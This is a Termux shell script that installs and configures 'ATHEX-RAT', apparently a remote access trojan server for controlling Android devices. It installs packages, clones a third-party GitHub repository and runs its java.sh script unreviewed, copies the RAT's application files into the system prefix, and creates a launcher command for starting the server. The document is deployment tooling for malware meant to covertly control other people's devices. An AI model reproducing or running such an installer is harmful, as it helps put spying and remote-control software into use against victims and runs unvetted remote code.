#!/data/data/com.termux/files/usr/bin/sh


apt update && apt upgrade -y
pkg install proot -y
pkg install wget -y
apt remove openjdk-17
clear

echo '
 █████╗ ████████╗██╗  ██╗███████╗██╗  ██╗     ██████╗  █████╗ ████████╗
██╔══██╗╚══██╔══╝██║  ██║██╔════╝╚██╗██╔╝     ██╔══██╗██╔══██╗╚══██╔══╝
███████║   ██║   ███████║█████╗   ╚███╔╝█████╗██████╔╝███████║   ██║   
██╔══██║   ██║   ██╔══██║██╔══╝   ██╔██╗╚════╝██╔══██╗██╔══██║   ██║   
██║  ██║   ██║   ██║  ██║███████╗██╔╝ ██╗     ██║  ██║██║  ██║   ██║   
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                                                                          
 '
 echo -e "\e[34m[\e[92m✓\e[34m]\033[92m INSTALLING REQUIREED PACKAGES"
 sleep 6.0
 apt install nodejs nano yarn -y
 clear

cd $HOME/ATHEX-RAT
git clone https://github.com/TheBizarreAbhishek/Java.git
cd Java
bash java.sh
clear
cd /data/data/com.termux/files/usr/share/
mkdir ATHEX-RAT 
cd $HOME/ATHEX-RAT/.files
pkg install wget
cp -r app assets clientData includes index.js package-lock.json package.json /data/data/com.termux/files/usr/share/ATHEX-RAT/
sed -i 'ccd $PREFIX/share/ATHEX-RAT/ && node index.js' $HOME/ATHEX-RAT/ATHEX-RAT
cp -r $HOME/ATHEX-RAT/ATHEX-RAT /data/data/com.termux/files/usr/bin/
chmod +x /data/data/com.termux/files/usr/bin/ATHEX-RAT

cd /data/data/com.termux/files/usr/share/ATHEX-RAT/
yarn add expressjs
clear
echo -e "\e[34mINSTALLED SUCCESSFULLY....[\e[92m✓\e[34m]\e[92m"
sleep 5.0
clear
echo -e "\e[1;34m[√] \e[96mType ATHEX-RAT To Start Server\e[0m"
